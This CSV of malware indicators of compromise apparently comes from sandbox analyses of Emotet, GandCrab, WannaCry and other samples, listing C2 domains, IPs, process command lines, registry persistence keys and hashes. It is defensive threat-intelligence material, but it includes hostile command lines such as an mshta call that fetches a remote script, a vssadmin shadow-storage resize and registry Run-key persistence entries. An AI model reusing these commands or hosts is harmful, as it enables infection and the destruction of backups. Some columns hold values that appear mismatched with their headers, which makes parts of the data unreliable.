file_name,Value,Address_Value,PID,Name,Parent_PID,File_Name,Command_Line,Current_Directory,Path,Full_Path,File_Path,Device_Path,File_Extension,Key,Hive,Data,Datatype,Display_Name,Service_Type,Startup_Command_Line,Startup_Type,Simple_Hash_Value,Type,Hostname_Value,Layer7_Protocol,Port_Value,Layer4_Protocol,Properties
emotet-2019-09-16.xml,smtp.gmail.com,207.204.50.27,2304,structsstructs.exe,1112,structsstructs.exe,--b23b2af2,C:\Windows\system32\,c:\users\aetadzjz\appdata\local\structsstructs\structsstructs.exe,STD_INPUT_HANDLE,windows\syswow64\ntdll.dll,c:\,exe,CLSID,HKEY_CLASSES_ROOT,"""C:\Users\aETAdzjz\AppData\Local\structsstructs\structsstructs.exe""",REG_SZ,,,,,,,,,,,
emotet-trickbot-july-2018-analysis.xml,comprealm.net,197.245.46.11,2368,ApplicationBase,2928,syncpack.exe, 35 ,C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\local\microsoft\windows\syncpack.exe,STD_OUTPUT_HANDLE,users\kft6utqw\appdata\local\temp\280.exe,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.icb.cl,HTTP,80,,"
                "
evasive-gootkit-banking-trojan.xml,localhost,109.230.199.30,3504,2500,2124,smsvchost32.exe,C:\Users\Nd9E1FYi\AppData\Local\Temp\SMSvcHost32.exe --vwxyz,C:\Users\Nd9E1FYi\Desktop\,c:\users\nd9e1fyi\appdata\local\temp\smsvchost32.exe,STD_OUTPUT_HANDLE,windows\system32\cmd.exe,c:\,ps1xml,Software\AppDataLow,HKEY_CURRENT_USER,3,REG_DWORD_LITTLE_ENDIAN,,,,,,,amd.martatovaglieri.it,HTTP,443,TCP,"
                "
evasive-guloader-cloudeye.xml,www.consultgenou.com,217.70.184.50,4296,xeuovifzzc.exe,1376,xeuovifzzc.exe,"""C:\Users\FD1HVy\Desktop\xeuovifzzc.exe"" ",C:\WINDOWS\system32\,c:\users\fd1hvy\desktop\xeuovifzzc.exe,,,,,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
excel-drops-malicious-payload-february-2018.xml,kdotraky.com,101.99.75.184,2352,CurrentVersion,1100,heidi.exe,"""C:\Users\kFT6uTQW\AppData\Local\Temp\heidi.exe"" ",C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\local\temp\heidi.exe,c:\users\kft6utqw\appdata\local\temp\heidi.exe,users\kft6utqw\appdata\local\temp\heidi.exe,c:\,exe,Software\Borland\Locales,HKEY_LOCAL_MACHINE,,,,,,,a6a97f17880e37067c822e14a75bb3af,MD5,kdotraky.com,HTTP,80,TCP,
excel-executes-powershell-key-logger-analysis.xml,checkip.dyndns.org,164.160.128.121,1948,ApplicationBase,1312,windows\microsoft.net\framework\v2.0.50727\config\machine.config,"""C:\Program Files (x86)\Microsoft Office\Office12\EXCEL.EXE""",C:\Users\kFT6uTQW\Desktop\,c:\users\kft6utqw\appdata\roaming\aap6.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,ps1xml,SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,HKEY_LOCAL_MACHINE,C:\Users\kFT6uTQW\AppData\Roaming\DURA Automotive Systems Inc\DURA Automotive Systems Inc.exe,REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,3lionsfactory.ga,HTTP,80,,
f664d5e8a470.xml,dns1.soprodns.ru,185.198.57.157,876,Global\PowerShell_CommandAnalysis_Lock_S-1-5-21-3643094112-4209292109-138530109-1001,3016,nslookup.exe,"""C:\Windows\System32\CScript.exe""  ""C:\Users\5JGHKO~1\Desktop\PRICAZ~1.JS"" ",C:\Windows\system32\,c:\windows\syswow64\nslookup.exe,STD_OUTPUT_HANDLE,users\5jghkoaofdp\appdata\roamingeox20.exe,c:\,mui,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,"""C:\Users\5JgHKoaOfdp\AppData\RoamingeOX20.eXe""",REG_SZ,,,,,e6cf22b643516b1cbc1454324c2aa5cb,MD5,telemetry7win.at,HTTP,80,,
f7d2c4199f08.xml,139.59.76.44:4000/lib/7z,139.59.76.44:4000,4020,AutoAdminLogon,4020,java.exe,"""C:\Program Files\Java\jre1.8.0_131\bin\java.exe""  -jar ""C:\Users\CIIHMN~1\Desktop\Remittance_Advice.jar"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\program files\java\jre1.8.0_131\bin\java.exe,STD_OUTPUT_HANDLE,program files\java\jre1.8.0_131\lib\rt.jar,c:\,pyd,Software\Python\PythonCore\2.7\PythonPath,HKEY_CURRENT_USER,,,,,,,,,,HTTP,80,,
gandcrab-ransomware-3-0-1-analysis.xml,ns1.wowservers.ru,46.139.176.151,3832,Domain,3832,nslookup.exe,nslookup carder.bit ns1.wowservers.ru,C:\Users\CIiHmnxMn6Ps\Desktop\,c:\windows\syswow64\nslookup.exe,STD_INPUT_HANDLE,users\ciihmnxmn6ps\appdata\roaming\microsoft\tlgmea.exe,c:\,txt,HARDWARE\DESCRIPTION\System\CentralProcessor\0,HKEY_LOCAL_MACHINE,"""C:\Users\CIiHmnxMn6Ps\AppData\Roaming\Microsoft\tlgmea.exe""",REG_SZ,,,,,c0f9e48bf74053ad638796ebbcb2bdf1,MD5,ipv4bot.whatismyipaddress.com,HTTP,80,,
gandcrab-ransomware-4-1-analysis.xml,www.macartegrise.eu,52.29.192.136,3604,1,1500,jeremy witt's dental records.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\Jeremy Witt's Dental Records.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\jeremy witt's dental records.exe,c:\programdata\696526f7.lock,programdata\696526f7.lock,c:\,txt,Keyboard Layout\Preload,HKEY_CURRENT_USER,,,,,,,87d25f04f055a446f937a3402cc19726,MD5,dna-cp.com,HTTP,80,,
Globeimposter-Ransomware-analysis.xml,http://rorymartin8.info/hudgy356?,,3736,DisableUNCCheck,3648,conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Users\CIIHMN~1\AppData\Local\Temp\,c:\windows\system32\conhost.exe,STD_OUTPUT_HANDLE,users\ciihmn~1\appdata\local\temp\w8nb,c:\,settingcontent-ms,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,C:\Users\CIiHmnxMn6Ps\AppData\Roaming\vwOrbzLbc.exe,REG_SZ,,,,,1298ca6e188d639b1f38c31677bfcd95,MD5,rorymartin8.info,HTTP,80,,
grandsoft-exploit-kit-gandcrab-analysis.xml,rated.dadsrnp.xyz,185.183.98.202,2192,DisableUNCCheck,2696,iexplore.exe,"""C:\Program Files (x86)\Internet Explorer\iexplore.exe"" about:blank",C:\Users\5P5NRG~1\AppData\Local\Temp\,c:\program files (x86)\internet explorer\iexplore.exe,STD_OUTPUT_HANDLE,windows\syswow64\svchost.exe,c:\,crab,HARDWARE\DESCRIPTION\System\CentralProcessor\0,HKEY_LOCAL_MACHINE,,,,,,,41dc497fc38c5cb08ca9943bd5b7e48a,MD5,rated.dadsrnp.xyz,HTTP,80,,
gryphon-ransomware-analysis.xml,weekendfakc.top,54.205.205.46,2312,ApplicationBase,780,reg.exe,"""C:\Program Files\Microsoft Office\Office14\WINWORD.EXE""",C:\Windows\system32\,c:\windows\syswow64\reg.exe,STD_ERROR_HANDLE,users\ybz8btyyvts 7lfsqb0g\ntuser.ini.4035,c:\,4035,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Users\YbZ8BTYYvts 7lFSQB0g\AppData\Roaming\Temp13684.exe,REG_SZ,,,,,b3713b894a8d7f366299a3d0a3449485,MD5,weekendfakc.top,HTTP,80,TCP,
guloader-delivering-azorult.xml,kalpvedafoundation.com,192.185.76.89,2876,DisplayName,1112,fghvhghvgfdgfhchfg.exe,C:\Users\aETAdzjz\AppData\Roaming\fghvhghvgfdgfhchfg.exe,C:\Windows\system32\,c:\users\aetadzjz\appdata\roaming\fghvhghvgfdgfhchfg.exe,,,,,Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000002,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
hancitor-malware.xml,foandrenla.com,,2500,cmd.exe,2512,cmd.exe,None,C:\Windows\system32,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,users\hjrd1koky ds8lujv\appdata\roaming\convincingly.exe,c:\,exe,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,eeef5204913a313f64a2e06dea22b936,MD5,,,,,
hawkeye-order-ref-ftp.xml,ftp.r2v2.co.uk,216.37.42.30,4044,Global\.net clr networking,4044,vbc.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\order ref ftp.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\windows\microsoft.net\framework\v2.0.50727\vbc.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,tmp,SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,HKEY_CURRENT_USER,,,,,,,,,,,55376,TCP,"
                "
hentai-oniichan-ransomware-berserker.xml,smtp.gmail.com,74.125.205.109,4488,ApplicationBase,4068,cmd.exe,vssadmin  resize shadowstorage /for=e: /on=e: /maxsize=401MB,C:\,c:\windows\syswow64\cmd.exe,,,,,Software\Microsoft\PowerShell\3\PowerShellEngine,HKEY_LOCAL_MACHINE,Unrestricted,REG_SZ,,,,,,,,,,,
iqy-file-flawedammyy-rat-analysis.xml,brembotembo.com,185.222.202.139,2092,DisableUNCCheck,2068,cmd.exe,"""C:\Program Files\Microsoft Office\Office16\MsoSync.exe""",C:\Users\qj4SUKboE\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,programdata\settings\wsus.exe,c:\,exe,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,52393308,REG_SZ,,,,,3e3d2e9fe0976c4c8d4c6be03f5d7c79,MD5,brembotembo.com,HTTP,80,TCP,"
                "
iqy-powershell-malicious-exe.xml,localhost,31.202.128.249,2476,ApplicationBase,1224,cmd.exe,"""C:\Program Files\Microsoft Office\Office15\EXCEL.EXE""",C:\Users\ADU0VK~1\AppData\Local\Temp\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,users\adu0vk~1\appdata\local\temp\total.exe,c:\,ps1xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,C:\Users\aDU0VK IWA5kLS\AppData\Roaming\winpoint.exe,REG_SZ,,,,,,,ms365box.com,HTTP,80,,
jaff-ransomware.xml,babil117.com,219.118.71.141,2460,DisableUNCCheck,2000,acrord32.exe,"""C:\Program Files (x86)\Adobe\Reader 9.1.0\Reader\AcroRd32.exe"" """"",C:\Users\HJRD1K~1\AppData\Local\Temp\A9R3F80.tmp,c:\program files (x86)\adobe\reader 9.1.0\reader\acrord32.exe,c:\users\hjrd1k~1\appdata\local\temp\eewadro20,users\hjrd1k~1\appdata\local\temp\eewadro20,c:\,jaff,Software\Microsoft\Command Processor,HKEY_CLASSES_ROOT,,,,,,,466db2d02db000f686f48c0700beb840,MD5,babil117.com,HTTP,80,TCP,
keylogger-packed-open-source-crypter.xml,koko35.ddns.net,109.60.97.243,296,Policies,484,svchost.exe,explorer.exe,C:\Windows\system32\,c:\windows\system32\svchost.exe,c:\users\ciihmn~1\appdata\local\temp\ciihmnxmn6ps2.txt,users\ciihmn~1\appdata\local\temp\ciihmnxmn6ps2.txt,c:\,exe,Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,HKEY_LOCAL_MACHINE,C:\Windows\system32\install\svchost.exe,REG_EXPAND_SZ,,,,,,,,,,,
locky-ransomware-lukitus-analysis.xml,http://calster.be/87wifhFsdf,212.109.220.109,2520,taskeng.exe,864,taskeng.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\taskeng.exe,c:\users\aetadzjz\appdata\local\temp\agraba8.exe,users\aetadzjz\appdata\local\temp\agraba8.exe,c:\,lukitus,Software\Microsoft\VBA\7.1\Common,HKEY_CLASSES_ROOT,0,REG_SZ,,,,,03ba639109a5ad5406f423d1d4d472fa,MD5,calster.be,HTTP,80,,
macro-less-word-doc-dde-analysis.xml,127.0.0.1,213.183.51.187,2444,DisableUNCCheck,2932,cmd.exe,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\bgc6u8~1\appdata\local\temp\iun4816.bat,c:\,ps1xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,CutBat,REG_SZ,,,,,64b2ac701a0d67da134e13b2efc46900,MD5,,HTTP,80,TCP,
malicious-javascript-myob-attack-analysis.xml,https://moranaccountants-my.sharepoint.com/personal/lily_moranaccountants_com_au/_layouts/15/guestaccess.aspx?docid=03559bd7bd473450fab4c679cae4be913&authkey=AXWiRPNRVvwj9BsVKKyrAsc&e=259ca72ab9534857b5c3964310916b09,192.99.181.10,2472,DisplayName,2728,dllhost.exe,"""C:\Windows\system32\dllhost.exe""",C:\Windows\system32\,c:\windows\syswow64\dllhost.exe,STD_OUTPUT_HANDLE,users\5p5nrg~1\desktop\myobsu~1.js,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,,,,,,,7c71ee83af910dec760c54b96ae19f9a,MD5,moranaccountants-my.sharepoint.com,HTTP,443,TCP,
malicious-word-doc-nov-2017-analysis.xml,www.indpts.com,108.163.227.35,2516,ApplicationBase,476,systeminfo.exe,"""C:\Users\aETAdzjz\AppData\Local\Microsoft\Windows\systeminfo.exe""",C:\Users\aETAdzjz\Desktop\,c:\users\aetadzjz\appdata\local\microsoft\windows\systeminfo.exe,STD_INPUT_HANDLE,programdata\fb2f.tmp,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.indpts.com,HTTP,80,TCP,
malware-uses-jar.xml,adom2.com.br,127.0.0.1,3064,cmd.exe,1172,cmd.exe,C:\Windows\Explorer.EXE,C:\Windows\system32,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\public\n3eg\n3e.vbs,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,9fffd4e723eebc43d03333c1a4413ab4,MD5,,HTTP,80,TCP,
ms-access-email-drops-keylogger-analysis.xml,127.0.0.1,45.55.57.244,3616,PackageCode,780,msiexec.exe,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe""",C:\Windows\system32\,c:\windows\system32\msiexec.exe,STD_OUTPUT_HANDLE,users\jpenum\appdata\local\temp\mw-3cee3894-a0d4-4f50-a87c-21985e988377\files\msmpeng.exe,c:\,exe,Software\Microsoft\Windows\CurrentVersion\Installer\InProgress,HKEY_LOCAL_MACHINE,,,,,,,,,jplymell.com,HTTP,443,TCP,
obfuscated-autoit-malware-analysis.xml,jluxi.dynu.com,185.62.188.68,2560,EXEpath,2636,regsvcs.exe,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe""",C:\Users\EEBsYm5\AppData\Local\Temp\60484525\,c:\windows\microsoft.net\framework\v4.0.30319\regsvcs.exe,c:\users\eebsym5\appdata\local\temp\60484525\hin.ppt,users\eebsym5\appdata\local\temp\60484525\hin.ppt,c:\,txt,Software\34419-GRNPWA\,HKEY_CURRENT_USER,C:\Users\EEBsYm5\AppData\Local\Temp\60484525\cih.exe C:\Users\EEBsYm5\AppData\Local\Temp\60484525\cvn-nhc,REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,,,1991,TCP,
obfuscated-jar-drops-adwind-rat-analysis.xml,ZgW5tdPu,fe80:0000:0000:0000:5969:84a4:f9e2:1f2b,3264,IgnoreUserSettings,3264,cmd.exe,"xcopy ""C:\Program Files\Java\jre7"" ""C:\Users\2XC7u663GxWc\AppData\Roaming\Oracle\"" /e",C:\Users\2XC7u663GxWc\Desktop\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\2xc7u663gxwc\.accessibility.properties,c:\,jar,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,"""C:\Users\2XC7u663GxWc\AppData\Roaming\Oracle\bin\javaw.exe"" -jar ""C:\Users\2XC7u663GxWc\cqsFQOTqbmg\zoIZCxYZMIr.EAMkwm""",REG_EXPAND_SZ,,,,,,,,,,,"
                "
ordinypt-wiper.xml,,,2556,ofgzdr.exe,1488,ofgzdr.exe,"""C:\Users\EEBsYm5\Desktop\ofgzdr.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\ofgzdr.exe,,,,,Software\Borland\Locales,HKEY_CURRENT_USER,,,,,,,,,,,,,
petya-not-petya.xml,,192.168.0.0,2376,wevtutil.exe,2512,wevtutil.exe,"""C:\Windows\SysWOW64\AGakmVMR.exe"" ""C:\Users\HJRD1K~1\Desktop\Petya.dll"" #1",C:\Windows\system32,c:\windows\syswow64\wevtutil.exe,STD_OUTPUT_HANDLE,users\hjrd1k~1\appdata\local\temp\6b4.tmp,C:\,tmp,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,9a7ffe65e0912f9379ba6e8e0b079fde,MD5,,,445,TCP,
rtf-doc-cve-2017-11882-analysis.xml,doc2th.com,192.232.251.15,2396,ApplicationBase,1552,Windows\SYSTEM32\ntdll.dll,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\svchost.exe,STD_INPUT_HANDLE,Windows\SYSTEM32\ntdll.dll,\??\C:\,ps1xml,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_LOCAL_MACHINE,C:\Program Files\Crfitq6x\gdigzvh.exe,REG_SZ,,,,,437efd63bf864669ef4312750c25c462,MD5,doc2th.com,HTTP,80,TCP,"
                "
rtf-doc-cve-exploit-analysis.xml,www.samyrai777m.p-host.in,185.211.244.133,2480,ApplicationBase,2480,mshta.exe,"""C:\Windows\System32\mshta.exe"" http://www.samyrai777m.p-host.in/t/t.php?thread=0",C:\Users\aETAdzjz\Desktop\,c:\windows\system32\mshta.exe,STD_INPUT_HANDLE,windows\system32\windowspowershell\v1.0\wsman.format.ps1xml,c:\,ps1xml,Software\Microsoft,HKEY_CURRENT_USER,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.samyrai777m.p-host.in,HTTP,80,TCP,
tdl4-rootkit.xml,127.0.0.1,,1292,svchost.exe,468,svchost.exe,C:\Windows\SysWOW64\ping.exe 127.0.0.1 -t,C:\Windows\system32,c:\windows\system32\svchost.exe,c:\users\hjrd1k~1\appdata\local\temp\3bd8.tmp,users\hjrd1k~1\appdata\local\temp\3bd8.tmp,C:\,exe,software\microsoft\windows\currentversion\internet settings\zones\3,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,6zrt3vuwf-39qwkam.com,HTTP,80,TCP,
trickbot-2019-05-16.xml,91.248.182.84.zen.spamhaus.org,185.255.55.29,3792,ApplicationBase,532,cmd.exe,svchost.exe,C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls,HKEY_LOCAL_MACHINE,1,REG_SZ,,,,,,,,,,,
unnam3d-ransomware.xml,,,348,Name,2376,cmd.exe,"""C:\Users\WhuOXYsD\AppData\Local\Temp\UNNAM3D.EXE"" ",C:\Users\WhuOXYsD\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\microsoft.net\framework\v4.0.30319\clrjit.dll,c:\,xlsx,Software\WinRAR\Profiles\0,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,,,,,,,
wannacry-ransomware.xml,www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com,127.0.0.1,2652,taskdl.exe,2560,taskdl.exe,taskdl.exe,C:\ProgramData\qxtqusdnjzrizx418,c:\programdata\qxtqusdnjzrizx418\taskdl.exe,c:\windows\temp\hibsys.wncryt,windows\temp\hibsys.wncryt,C:\,wncryt,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,C:\ProgramData\qxtqusdnjzrizx418,REG_SZ,Microsoft Security Center (2.0) Service,SERVICE_WIN32_OWN_PROCESS,C:\Users\DSsDPMx042\Desktop\WanaDecrypt0r.bin.exe -m security,SERVICE_AUTO_START,84c82835a5d21bbcf75a61706d8ab549,MD5,www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com,HTTP,80,TCP,
word-doc-context-aware-payload.xml,www.events4u.cz,93.185.102.11,2324,ApplicationBase,852,taskeng.exe,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Users\aDU0VK IWA5kLS\Desktop\,c:\windows\system32\taskeng.exe,STD_INPUT_HANDLE,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,0ebfd6e45dea48c7f54b5574d69da458,MD5,www.events4u.cz,HTTP,80,TCP,
word-doc-downloads-emotet.xml,kerineal.com,184.168.152.148,2552,ApplicationBase,2968,viewcom.exe,"""C:\Users\ATVeyDl98Z\AppData\Local\Microsoft\Windows\viewcom.exe""",C:\Users\ATVeyDl98Z\Desktop\,c:\users\atveydl98z\appdata\local\microsoft\windows\viewcom.exe,c:\email.doc,email.doc,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,"""C:\Users\ATVeyDl98Z\AppData\Local\Microsoft\Windows\viewcom.exe""",REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,kerineal.com,HTTP,80,TCP,
wsf-payload-server-accept-connections-analysis.xml,resolver1.opendns.com,127.0.0.1,3968,Client,1832,conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\system32\,c:\windows\system32\conhost.exe,STD_OUTPUT_HANDLE,windows\system32\ntdll.dll,c:\,tmp,Software\AppDataLow\Software\Microsoft\07430283-BA24-D1EC-FC2B-8E95F08FA299,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.atdrrtd.vs,HTTP,443,TCP,"
                "
XZZX-cryptomix-ransomware-analysis.xml,,,2500,E1010314,2500,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\xzzx_cryptMix.vir.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,programdata\f06c3c509054x0b7d28zcddbb17087b9c3e.xzzx,c:\,xzzx,Software\Microsoft\Windows\CurrentVersion,HKEY_CURRENT_USER,"""C:\ProgramData\BCE1010314.exe""",REG_DWORD_LITTLE_ENDIAN,,,,,99b4288995857301d312d28c2291153d,MD5,,,,,
zerocleare-1.xml,,,1456,svchost.exe,1092,svchost.exe,%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,VBoxDrv,SERVICE_KERNEL_DRIVER,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\saddrv.sys,SERVICE_DEMAND_START,,,,,,,
zeus-panda-banking-trojan-analysis.xml,330f35e9f647.loan/31F9UVfEun/0I1aalj/7QGREH4HU/RK/5rEg,,4032,UninstallString,788,users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,C:\Windows\SysWOW64\svchost.exe -k netsvcs,C:\Windows\system32\,c:\windows\syswow64\svchost.exe,c:\users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,c:\,exe,SOFTWARE\Microsoft\Ombi,HKEY_CURRENT_USER,"""C:\Users\CIiHmnxMn6Ps\AppData\Roaming\Macromedia\Flash Player\macromedia.com\support\flashplayer\sys\containers.exe""",REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,330f35e9f647.loan,HTTP,443,,
